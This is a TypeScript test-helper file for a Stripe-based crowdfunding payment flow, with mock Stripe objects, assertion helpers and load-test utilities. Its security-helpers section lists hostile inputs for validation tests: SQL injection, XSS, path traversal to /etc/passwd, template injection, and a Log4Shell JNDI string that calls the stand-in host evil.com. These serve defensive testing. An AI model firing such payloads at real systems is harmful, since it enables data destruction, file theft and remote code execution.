/**
 * Payment Testing Utilities and Helpers
 * 
 * This file provides comprehensive utilities for testing Stripe payment integration,
 * including mock factories, test data generators, and assertion helpers.
 */

import Stripe from 'stripe';
// Use require for faker to avoid ESM issues in Jest
const { faker } = require('@faker-js/faker');

// Mock Stripe Objects Factory
export class StripeObjectFactory {
  /**
   * Creates a mock Stripe checkout session
   */
  static createCheckoutSession(overrides: Partial<Stripe.Checkout.Session> = {}): Stripe.Checkout.Session {
    const defaults: Partial<Stripe.Checkout.Session> = {
      id: `cs_${faker.string.alphanumeric(24)}`,
      object: 'checkout.session',
      after_expiration: null,
      allow_promotion_codes: null,
      amount_subtotal: 10000,
      amount_total: 10000,
      automatic_tax: { enabled: false, status: null },
      billing_address_collection: null,
      cancel_url: 'https://example.com/cancel',
      client_reference_id: null,
      client_secret: null,
      consent: null,
      consent_collection: null,
      created: Math.floor(Date.now() / 1000),
      currency: 'usd',
      currency_conversion: null,
      custom_fields: [],
      custom_text: {
        after_submit: null,
        shipping_address: null,
        submit: null,
        terms_of_service_acceptance: null
      },
      customer: null,
      customer_creation: 'if_required',
      customer_details: {
        address: null,
        email: faker.internet.email(),
        name: null,
        phone: null,
        tax_exempt: 'none',
        tax_ids: []
      },
      customer_email: faker.internet.email(),
      expires_at: Math.floor(Date.now() / 1000) + 86400,
      invoice: null,
      invoice_creation: null,
      livemode: false,
      locale: null,
      metadata: {
        campaignId: `campaign_${faker.string.uuid()}`,
        pledgeTierId: `tier_${faker.string.uuid()}`,
        backerId: `user_${faker.string.uuid()}`
      },
      mode: 'payment',
      payment_intent: `pi_${faker.string.alphanumeric(24)}`,
      payment_link: null,
      payment_method_collection: 'if_required',
      payment_method_configuration_details: null,
      payment_method_options: {},
      payment_method_types: ['card'],
      payment_status: 'unpaid',
      phone_number_collection: { enabled: false },
      recovered_from: null,
      setup_intent: null,
      shipping_address_collection: null,
      shipping_cost: null,
      shipping_details: null,
      shipping_options: [],
      status: 'open',
      submit_type: null,
      subscription: null,
      success_url: 'https://example.com/success',
      total_details: {
        amount_discount: 0,
        amount_shipping: 0,
        amount_tax: 0
      },
      ui_mode: 'hosted',
      url: `https://checkout.stripe.com/c/pay/cs_${faker.string.alphanumeric(24)}`
    };

    return { ...defaults, ...overrides } as Stripe.Checkout.Session;
  }

  /**
   * Creates a mock Stripe payment intent
   */
  static createPaymentIntent(overrides: Partial<Stripe.PaymentIntent> = {}): Stripe.PaymentIntent {
    const defaults: Partial<Stripe.PaymentIntent> = {
      id: `pi_${faker.string.alphanumeric(24)}`,
      object: 'payment_intent',
      amount: 10000,
      amount_capturable: 0,
      amount_details: { tip: {} },
      amount_received: 10000,
      application: null,
      application_fee_amount: 500,
      automatic_payment_methods: null,
      canceled_at: null,
      cancellation_reason: null,
      capture_method: 'automatic',
      client_secret: `pi_${faker.string.alphanumeric(24)}_secret_${faker.string.alphanumeric(24)}`,
      confirmation_method: 'automatic',
      created: Math.floor(Date.now() / 1000),
      currency: 'usd',
      customer: null,
      description: null,
      invoice: null,
      last_payment_error: null,
      latest_charge: `ch_${faker.string.alphanumeric(24)}`,
      livemode: false,
      metadata: {
        campaignId: `campaign_${faker.string.uuid()}`,
        pledgeTierId: `tier_${faker.string.uuid()}`,
        backerId: `user_${faker.string.uuid()}`,
        pledgeAmount: '100'
      },
      next_action: null,
      on_behalf_of: null,
      payment_method: `pm_${faker.string.alphanumeric(24)}`,
      payment_method_configuration_details: null,
      payment_method_options: {},
      payment_method_types: ['card'],
      processing: null,
      receipt_email: null,
      review: null,
      setup_future_usage: null,
      shipping: null,
      source: null,
      statement_descriptor: null,
      statement_descriptor_suffix: null,
      status: 'succeeded',
      transfer_data: {
        destination: `acct_${faker.string.alphanumeric(16)}`
      },
      transfer_group: null
    };

    return { ...defaults, ...overrides } as Stripe.PaymentIntent;
  }

  /**
   * Creates a mock Stripe webhook event
   */
  static createWebhookEvent(
    type: string,
    data: any,
    overrides: Partial<Stripe.Event> = {}
  ): Stripe.Event {
    const defaults: Partial<Stripe.Event> = {
      id: `evt_${faker.string.alphanumeric(24)}`,
      object: 'event',
      account: null,
      api_version: '2024-06-20',
      created: Math.floor(Date.now() / 1000),
      data: {
        object: data,
        previous_attributes: undefined
      },
      livemode: false,
      pending_webhooks: 1,
      request: {
        id: `req_${faker.string.alphanumeric(24)}`,
        idempotency_key: null
      },
      type: type as Stripe.Event.Type
    };

    return { ...defaults, ...overrides } as Stripe.Event;
  }

  /**
   * Creates a mock Stripe charge for dispute testing
   */
  static createCharge(overrides: Partial<Stripe.Charge> = {}): Stripe.Charge {
    const defaults: Partial<Stripe.Charge> = {
      id: `ch_${faker.string.alphanumeric(24)}`,
      object: 'charge',
      amount: 10000,
      amount_captured: 10000,
      amount_refunded: 0,
      application: null,
      application_fee: null,
      application_fee_amount: 500,
      balance_transaction: `txn_${faker.string.alphanumeric(24)}`,
      billing_details: {
        address: null,
        email: faker.internet.email(),
        name: faker.person.fullName(),
        phone: null
      },
      calculated_statement_descriptor: null,
      captured: true,
      created: Math.floor(Date.now() / 1000),
      currency: 'usd',
      customer: null,
      description: null,
      disputed: false,
      failure_balance_transaction: null,
      failure_code: null,
      failure_message: null,
      fraud_details: {},
      invoice: null,
      livemode: false,
      metadata: {},
      on_behalf_of: null,
      outcome: {
        network_status: 'approved_by_network',
        reason: null,
        risk_level: 'normal',
        risk_score: 32,
        seller_message: 'Payment complete.',
        type: 'authorized'
      },
      paid: true,
      payment_intent: `pi_${faker.string.alphanumeric(24)}`,
      payment_method: `pm_${faker.string.alphanumeric(24)}`,
      payment_method_details: {
        card: {
          brand: 'visa',
          checks: {
            address_line1_check: null,
            address_postal_code_check: null,
            cvc_check: 'pass'
          },
          country: 'US',
          exp_month: 12,
          exp_year: 2025,
          fingerprint: faker.string.alphanumeric(16),
          funding: 'credit',
          last4: '4242',
          network: 'visa',
          three_d_secure: null,
          wallet: null
        },
        type: 'card'
      },
      receipt_email: null,
      receipt_number: null,
      receipt_url: `https://pay.stripe.com/receipts/${faker.string.alphanumeric(24)}`,
      refunded: false,
      refunds: {
        object: 'list',
        data: [],
        has_more: false,
        total_count: 0,
        url: `/v1/charges/ch_${faker.string.alphanumeric(24)}/refunds`
      },
      review: null,
      shipping: null,
      source_transfer: null,
      statement_descriptor: null,
      statement_descriptor_suffix: null,
      status: 'succeeded',
      transfer_data: {
        destination: `acct_${faker.string.alphanumeric(16)}`
      },
      transfer_group: null
    };

    return { ...defaults, ...overrides } as Stripe.Charge;
  }

  /**
   * Creates a mock Stripe dispute
   */
  static createDispute(overrides: Partial<Stripe.Dispute> = {}): Stripe.Dispute {
    const defaults: Partial<Stripe.Dispute> = {
      id: `dp_${faker.string.alphanumeric(24)}`,
      object: 'dispute',
      amount: 10000,
      balance_transactions: [],
      charge: `ch_${faker.string.alphanumeric(24)}`,
      created: Math.floor(Date.now() / 1000),
      currency: 'usd',
      evidence: {
        access_activity_log: null,
        billing_address: null,
        cancellation_policy: null,
        cancellation_policy_disclosure: null,
        cancellation_rebuttal: null,
        customer_communication: null,
        customer_email_address: faker.internet.email(),
        customer_name: faker.person.fullName(),
        customer_purchase_ip: faker.internet.ip(),
        customer_signature: null,
        duplicate_charge_documentation: null,
        duplicate_charge_explanation: null,
        duplicate_charge_id: null,
        product_description: null,
        receipt: null,
        refund_policy: null,
        refund_policy_disclosure: null,
        refund_refusal_explanation: null,
        service_date: null,
        service_documentation: null,
        shipping_address: null,
        shipping_carrier: null,
        shipping_date: null,
        shipping_documentation: null,
        shipping_tracking_number: null,
        uncategorized_file: null,
        uncategorized_text: null
      },
      evidence_details: {
        due_by: Math.floor(Date.now() / 1000) + (7 * 24 * 60 * 60), // 7 days from now
        has_evidence: false,
        past_due: false,
        submission_count: 0
      },
      is_charge_refundable: true,
      livemode: false,
      metadata: {},
      network_reason_code: '4855',
      reason: 'fraudulent',
      status: 'warning_needs_response'
    };

    return { ...defaults, ...overrides } as Stripe.Dispute;
  }

  /**
   * Creates a mock Stripe refund
   */
  static createRefund(overrides: Partial<Stripe.Refund> = {}): Stripe.Refund {
    const defaults: Partial<Stripe.Refund> = {
      id: `re_${faker.string.alphanumeric(24)}`,
      object: 'refund',
      amount: 5000, // Partial refund
      balance_transaction: `txn_${faker.string.alphanumeric(24)}`,
      charge: `ch_${faker.string.alphanumeric(24)}`,
      created: Math.floor(Date.now() / 1000),
      currency: 'usd',
      metadata: {},
      payment_intent: `pi_${faker.string.alphanumeric(24)}`,
      reason: 'requested_by_customer',
      receipt_number: null,
      source_transfer_reversal: null,
      status: 'succeeded',
      transfer_reversal: null
    };

    return { ...defaults, ...overrides } as Stripe.Refund;
  }
}

// Test Data Generators
export class PaymentTestData {
  /**
   * Generates test campaign data
   */
  static generateCampaign(overrides: any = {}) {
    return {
      id: `campaign_${faker.string.uuid()}`,
      title: faker.lorem.words(3),
      description: faker.lorem.paragraph(),
      status: 'published',
      raisedDollars: faker.number.int({ min: 0, max: 10000 }),
      goalDollars: faker.number.int({ min: 10000, max: 100000 }),
      pledgeTiers: [
        {
          id: `tier_${faker.string.uuid()}`,
          title: 'Basic Tier',
          description: 'Basic support level',
          amountDollars: 100,
          isActive: true
        },
        {
          id: `tier_${faker.string.uuid()}`,
          title: 'Premium Tier',
          description: 'Premium support level',
          amountDollars: 500,
          isActive: true
        }
      ],
      ...overrides
    };
  }

  /**
   * Generates test user data
   */
  static generateUser(overrides: any = {}) {
    return {
      id: `user_${faker.string.uuid()}`,
      email: faker.internet.email(),
      name: faker.person.fullName(),
      roles: ['backer'],
      ...overrides
    };
  }

  /**
   * Generates test pledge data
   */
  static generatePledge(overrides: any = {}) {
    return {
      id: `pledge_${faker.string.uuid()}`,
      campaignId: `campaign_${faker.string.uuid()}`,
      backerId: `user_${faker.string.uuid()}`,
      pledgeTierId: `tier_${faker.string.uuid()}`,
      amountDollars: faker.number.int({ min: 100, max: 1000 }),
      currency: 'USD',
      status: 'pending',
      paymentRef: `pi_${faker.string.alphanumeric(24)}`,
      stripeSessionId: `cs_${faker.string.alphanumeric(24)}`,
      createdAt: new Date(),
      updatedAt: new Date(),
      ...overrides
    };
  }

  /**
   * Generates checkout request data
   */
  static generateCheckoutRequest(overrides: any = {}) {
    return {
      campaignId: `campaign_${faker.string.uuid()}`,
      pledgeTierId: `tier_${faker.string.uuid()}`,
      pledgeAmount: faker.number.int({ min: 100, max: 1000 }),
      backerEmail: faker.internet.email(),
      successUrl: faker.internet.url(),
      cancelUrl: faker.internet.url(),
      ...overrides
    };
  }
}

// Test Assertion Helpers
export class PaymentAssertions {
  /**
   * Asserts that a Stripe checkout session was created with correct parameters
   */
  static assertCheckoutSessionCreation(
    mockCreate: jest.MockedFunction<any>,
    expectedParams: {
      currency?: string;
      amount?: number;
      appFee?: number;
      customerEmail?: string;
      metadata?: Record<string, string>;
    }
  ) {
    expect(mockCreate).toHaveBeenCalledWith(
      expect.objectContaining({
        payment_method_types: ['card'],
        mode: 'payment',
        customer_email: expectedParams.customerEmail,
        line_items: expect.arrayContaining([
          expect.objectContaining({
            price_data: expect.objectContaining({
              currency: expectedParams.currency || 'usd',
              unit_amount: expectedParams.amount
            }),
            quantity: 1
          })
        ]),
        payment_intent_data: expect.objectContaining({
          application_fee_amount: expectedParams.appFee,
          transfer_data: expect.objectContaining({
            destination: expect.any(String)
          }),
          metadata: expect.objectContaining(expectedParams.metadata || {})
        })
      })
    );
  }

  /**
   * Asserts that a pledge was created with correct data
   */
  static assertPledgeCreation(
    mockCreate: jest.MockedFunction<any>,
    expectedData: {
      campaignId: string;
      backerId: string;
      amountDollars: number;
      currency: string;
      status: string;
      paymentRef: string;
      stripeSessionId: string;
      pledgeTierId?: string;
    }
  ) {
    expect(mockCreate).toHaveBeenCalledWith({
      data: expect.objectContaining(expectedData),
      include: expect.objectContaining({
        backer: true,
        campaign: true
      })
    });
  }

  /**
   * Asserts that campaign raised amount was updated
   */
  static assertCampaignUpdate(
    mockUpdate: jest.MockedFunction<any>,
    campaignId: string,
    incrementAmount: number
  ) {
    expect(mockUpdate).toHaveBeenCalledWith({
      where: { id: campaignId },
      data: {
        raisedDollars: {
          increment: incrementAmount
        }
      }
    });
  }

  /**
   * Asserts that pledge status was updated
   */
  static assertPledgeStatusUpdate(
    mockUpdateMany: jest.MockedFunction<any>,
    paymentRef: string,
    fromStatus: string,
    toStatus: string
  ) {
    expect(mockUpdateMany).toHaveBeenCalledWith({
      where: {
        paymentRef: paymentRef,
        status: fromStatus
      },
      data: {
        status: toStatus
      }
    });
  }

  /**
   * Asserts that confirmation email was sent
   */
  static assertConfirmationEmailSent(
    mockSendEmail: jest.MockedFunction<any>,
    recipientEmail: string,
    expectedData: {
      campaignTitle: string;
      campaignId: string;
      pledgeAmount: number;
      backerName?: string;
    }
  ) {
    expect(mockSendEmail).toHaveBeenCalledWith(
      recipientEmail,
      expect.objectContaining(expectedData)
    );
  }
}

// Error Scenarios
export class PaymentErrorScenarios {
  /**
   * Common Stripe API errors
   */
  static readonly STRIPE_ERRORS = {
    CARD_DECLINED: new Error('Your card was declined.'),
    INSUFFICIENT_FUNDS: new Error('Your card has insufficient funds.'),
    FRAUDULENT: new Error('Your payment was blocked by fraud detection.'),
    PROCESSING_ERROR: new Error('An error occurred while processing your card.'),
    NETWORK_ERROR: new Error('Network error occurred.'),
    API_ERROR: new Error('Stripe API is temporarily unavailable.')
  };

  /**
   * Database error scenarios
   */
  static readonly DATABASE_ERRORS = {
    CONNECTION_FAILED: new Error('Database connection failed'),
    UNIQUE_CONSTRAINT: new Error('Unique constraint violation'),
    FOREIGN_KEY_CONSTRAINT: new Error('Foreign key constraint violation'),
    TIMEOUT: new Error('Database query timeout')
  };

  /**
   * Authentication error scenarios
   */
  static readonly AUTH_ERRORS = {
    UNAUTHORIZED: new Error('Authentication required'),
    FORBIDDEN: new Error('Insufficient permissions'),
    SESSION_EXPIRED: new Error('Session has expired')
  };
}

// Performance Test Helpers
export class PaymentPerformanceHelpers {
  /**
   * Creates concurrent payment requests for load testing
   */
  static async createConcurrentPayments(
    count: number,
    paymentFunction: () => Promise<any>
  ): Promise<{
    successful: number;
    failed: number;
    averageTime: number;
    errors: Error[];
  }> {
    const startTime = Date.now();
    const promises = Array(count).fill(null).map(() => {
      const requestStart = Date.now();
      return paymentFunction().then(
        result => ({ success: true, result, time: Date.now() - requestStart }),
        error => ({ success: false, error, time: Date.now() - requestStart })
      );
    });

    const results = await Promise.all(promises);
    const successful = results.filter(r => r.success).length;
    const failed = results.filter(r => !r.success).length;
    const errors = results.filter(r => !r.success).map(r => r.error);
    const averageTime = results.reduce((sum, r) => sum + r.time, 0) / results.length;

    return {
      successful,
      failed,
      averageTime,
      errors
    };
  }

  /**
   * Measures payment processing time
   */
  static async measurePaymentTime<T>(
    paymentFunction: () => Promise<T>
  ): Promise<{ result: T; duration: number }> {
    const startTime = performance.now();
    const result = await paymentFunction();
    const duration = performance.now() - startTime;
    
    return { result, duration };
  }
}

// Security Test Helpers
export class PaymentSecurityHelpers {
  /**
   * Tests for potential injection attacks in payment data
   */
  static readonly INJECTION_PAYLOADS = [
    "'; DROP TABLE pledges; --",
    '<script>alert("xss")</script>',
    '${jndi:ldap://evil.com/a}',
    '../../../etc/passwd',
    'javascript:alert("xss")',
    '<svg onload=alert("xss")>',
    'null',
    'undefined',
    '{{7*7}}',
    '${7*7}'
  ];

  /**
   * Tests webhook signature validation with various tampering attempts
   */
  static generateTamperedWebhookSignatures(): string[] {
    return [
      'v1=invalid_signature',
      't=123456789,v1=tampered_signature',
      'v1=',
      '',
      'malformed_signature',
      't=999999999999,v1=expired_signature',
      'v2=future_version_signature'
    ];
  }

  /**
   * Generates potentially malicious payment amounts
   */
  static readonly MALICIOUS_AMOUNTS = [
    -100,           // Negative amount
    0,              // Zero amount
    0.001,          // Fractional cent
    Number.MAX_VALUE, // Extremely large amount
    Infinity,       // Infinite amount
    NaN,           // Not a number
    '100.00',      // String instead of number
    null,          // Null value
    undefined      // Undefined value
  ];

  /**
   * Tests rate limiting scenarios
   */
  static async testRateLimit(
    requestFunction: () => Promise<any>,
    requestCount: number,
    timeWindow: number
  ): Promise<{
    totalRequests: number;
    blockedRequests: number;
    rateLimitTriggered: boolean;
  }> {
    const requests = [];
    const startTime = Date.now();
    
    for (let i = 0; i < requestCount; i++) {
      requests.push(
        requestFunction().then(
          result => ({ success: true, result }),
          error => ({ success: false, error })
        )
      );
    }

    const results = await Promise.all(requests);
    const totalTime = Date.now() - startTime;
    
    const totalRequests = results.length;
    const blockedRequests = results.filter(r => 
      !r.success && r.error.message.includes('rate limit')
    ).length;
    const rateLimitTriggered = blockedRequests > 0 || totalTime > timeWindow;

    return {
      totalRequests,
      blockedRequests,
      rateLimitTriggered
    };
  }
}

export { faker };